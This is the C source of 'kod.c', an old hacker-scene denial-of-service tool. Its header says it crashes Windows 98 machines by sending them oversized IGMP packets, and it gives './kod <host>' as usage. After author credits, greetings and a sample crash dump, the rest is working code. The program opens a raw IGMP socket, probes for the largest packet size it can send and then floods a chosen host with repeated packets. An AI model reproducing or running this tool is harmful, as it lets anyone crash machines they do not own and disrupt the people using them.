/*
::: [author] kod.c by klepto/defile  klepto@antisocial.com / defile@EFnet
::: [stuph ] bug found by klepto / total rewrite on *nix platform by defile
::: [notes ] bluescreens windows users(98/98se) and kills tcp stack
::: [m$ bug] windows handles igmp badly and this is the result
::: [greets] amputee/nizda/nyt/ignitor/skyline/codelogic/ill`/conio/egotrip/TFreak/napster
::: [greets] dist(test monkey)/naz(you rule period.)/#havok/#irc_addict/#kgb/#eof/everyone
::: [action] ./kod <host> and BEWM!
::: [rant  ] there will be lots of rewrites to this.. just get our name right!
de omnibus dubitandum
*/

/* 
windows core dump output (*whee*)
An exception 0E has occurred at 0028:C14C9212 in VxD VIP(01) +
00006C72.  This was called from 0028:C183FF54 in VcD PPPMAC(04) +
000079BR.  It may be possible to continue normally(*not*).
*/

/*
there will be more bugs like this until bill "big moneybags" gates
puts more effort into making windows more stable instead of patching holes.
*/

#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

size_t hits = 5;
unsigned short port = 100;

void usage (char *progname)
{
  printf("Usage: %s <host> -p port -t hits\n", progname);
  exit(1);
}

void parse_args (int argc, char *argv[], char **target)
{
	int y;

	*target = argv[1];
	
	if (argv[1][0] == '-') {
		printf ("Must specify a target.\n");
		exit (1);
	}
	for (y=2; y < argc; y++) {
		if (!strcmp(argv[y], "-p")) {
			y++;
			port = atoi (argv[y]);
		} else if (!strcmp(argv[y], "-t")) {
			y++;
			hits = atoi (argv[y]);
		}
	}	
}


int main (int argc, char *argv[])
{
	struct sockaddr_in	sin;
	struct hostent	*he;
	size_t maxpkt = 15000;
	char *target;
	char buf[15000];
	int sd;
	
	if (argc < 2) 
		usage (argv[0]);

	parse_args (argc, argv, &target);

	if ((he = gethostbyname (target)) == NULL) {
		herror (target);
		exit (1);
	}
	memcpy (&sin.sin_addr.s_addr, he->h_addr, he->h_length);
	
	sin.sin_family = AF_INET;
	sin.sin_port = htons (port);
	
	if ((sd = socket (AF_INET, SOCK_RAW, 2)) == -1) {
		perror ("error: socket()");
		exit (1);
	}

	if (-1 == connect (sd, (struct sockaddr *)&sin, sizeof (sin))) {
		perror ("error: connect()");
		close (sd);
		exit (1);
	}

	puts ("Determining max MSGSIZE");
	while (send (sd, buf, maxpkt, 0) == -1) {
		if (EMSGSIZE != errno) {
			perror ("error: send()");
			close (sd);
			exit (1);
		}
		maxpkt -= 1;
	}
	hits--;

	printf ("Max MSGSIZE is %d\n..%d bytes [%s:%d]..\n", maxpkt,
			maxpkt, target, port);
	while (hits--) {
		usleep (50000);
		if (send (sd, buf, maxpkt, 0) == -1) {
			perror ("error: send()");
			close (sd);
			exit (1);
		}
		printf ("..%d bytes [%s:%d]..\n", maxpkt, target, port);
	}

	sleep (1);
	close (sd);
	puts ("complete.");
	
	exit (0);
}
	
